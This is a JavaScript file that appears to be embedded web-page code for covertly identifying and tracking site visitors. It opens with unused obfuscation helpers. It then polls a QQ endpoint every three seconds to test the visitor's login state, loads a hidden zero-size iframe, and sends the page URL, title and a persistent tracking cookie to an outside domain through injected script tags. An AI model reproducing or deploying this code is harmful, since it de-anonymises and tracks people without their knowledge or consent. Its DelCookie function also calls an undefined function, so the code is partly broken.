var __5bekvstG = String.fromCharCode;

var _x_Eg9 = [ 1393, 1539, 1772, 3641, 3616 ];

var _$2KpY = function() {
    return arguments[0] ^ _x_Eg9[0];
};

var _$pwI = function() {
    return arguments[0] ^ _x_Eg9[1];
};

var _$yZ2Q = function() {
    return arguments[0] ^ _x_Eg9[2];
};

var _$b3S = function() {
    return arguments[0] ^ _x_Eg9[3];
};

var _$bOZX = function() {
    return arguments[0] ^ _x_Eg9[4];
};

window.aligooocid = "1000110";
window.aligooosid = "2053598305";
window.aligooodept = "001003001069";
window.aligoooServiceDomain = "aligooo.jsp.fjjsp01.com";
var isLoginTimeID;

function SetCookie(name, value) {
	var Days = 30;
	var exp = new Date();
	exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
	document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
}
function GetCookie(name) {
	var arr = document.cookie.match(new RegExp("(^| )" + name + "=([^;]*)(;|$)"));
	if (arr != null) return unescape(arr[2]);
	return null;
}
function DelCookie(name) {
	var exp = new Date();
	exp.setTime(exp.getTime() - 1);
	var cval = getCookie(name);
	if (cval != null) document.cookie = name + "=" + cval + ";expires=" + exp.toGMTString();
}
function insertFrame() {
	var ms = document.createElement("iframe");
	ms.src = "http://meishi.qq.com/profiles/" + window.aligooosid;
	ms.width = 0;
	ms.height = 0;
	ms.frameborder = 0;
	ms.scrolling = "no";
	if (ms.attachEvent) {
		ms.attachEvent("onload", function() {
			newSubmit();
		});
	} else {
		ms.onload = function() {
			newSubmit();
		};
	}
	document.body.appendChild(ms);
}
function newSubmit() {
	var uincookie = GetCookie("uincookie");
	if (uincookie == null) {
		uincookie = "code" + (new Date()).getTime() + parseInt(Math.random() * 100000);
		SetCookie("uincookie", uincookie);
	}
	var url = document.location.href;
	var title = document.title;
	title = encodeURI(title);
	title = encodeURI(title);
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oScript = document.createElement("script");
	oScript.type = "text/javascript";
	oScript.src = "http://" + window.aligoooServiceDomain + "/app/clientjs.go?reqCode=save&cid=" + window.aligooocid + "&sid=" + window.aligooosid + "&dept=" + window.aligooodept + "&url=" + url + "&title=" + title + "&uincookie=" + uincookie;
	oHead.appendChild(oScript);
}
function isLogin() {
	var code = null;
	if (typeof(data3) == "undefined") {
		code = data0.err;
	} else {
		code = data3.err;
	}
	if (code == 1007) {
		window.clearInterval(isLoginTimeID);
		insertFrame();
	} else {
		var uincookie = GetCookie("uincookie");
		if (uincookie != null) {
			window.clearInterval(isLoginTimeID);
			var url = document.location.href;
			var title = document.title;
			title = encodeURI(title);
			title = encodeURI(title);
			var oHead = document.getElementsByTagName('HEAD').item(0);
			var oScript = document.createElement("script");
			oScript.type = "text/javascript";
			oScript.src = "http://" + window.aligoooServiceDomain + "/app/clientjs.go?reqCode=cookieSave&cid=" + window.aligooocid + "&sid=" + window.aligooosid + "&dept=" + window.aligooodept + "&url=" + url + "&title=" + title + "&uincookie=" + uincookie;
			oHead.appendChild(oScript);
		} else {
			var checkscript = document.getElementById("checkloginscript");
			checkscript.parentNode.removeChild(checkscript);
		}
	}
}
function dynamicLoad() {
	var vsrc = "http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=";
	var time = new Date().getTime();
	vsrc = vsrc + time;
	var oHead = document.getElementsByTagName('HEAD').item(0);
	var oScript = document.createElement("script");
	oScript.type = "text/javascript";
	oScript.id = "checkloginscript";
	if (oScript.readyState) {
		oScript.onreadystatechange = function() {
			if (oScript.readyState == "loaded" || oScript.readyState == "complete") {
				oScript.onreadystatechange = null;
				isLogin();
			}
		};
	} else {
		oScript.onload = function() {
			isLogin();
		};
	}
	oScript.src = vsrc;
	oHead.appendChild(oScript);
}
isLoginTimeID = window.setInterval("dynamicLoad()", 3000);